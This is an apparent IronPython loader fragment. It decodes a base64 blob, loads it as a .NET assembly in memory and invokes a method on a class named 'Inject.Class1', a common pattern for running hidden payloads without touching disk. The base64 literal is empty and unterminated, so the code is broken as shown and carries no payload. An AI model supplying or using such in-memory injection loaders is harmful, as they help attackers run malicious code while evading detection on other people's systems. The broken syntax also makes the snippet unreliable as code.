from System.Reflection import Assembly
from System import Convert
newBytes = Convert.FromBase64String("
code = Assembly.Load(newBytes);
clas = code.GetType("Inject.Class1");
clas.GetMethod("a").Invoke(None,None)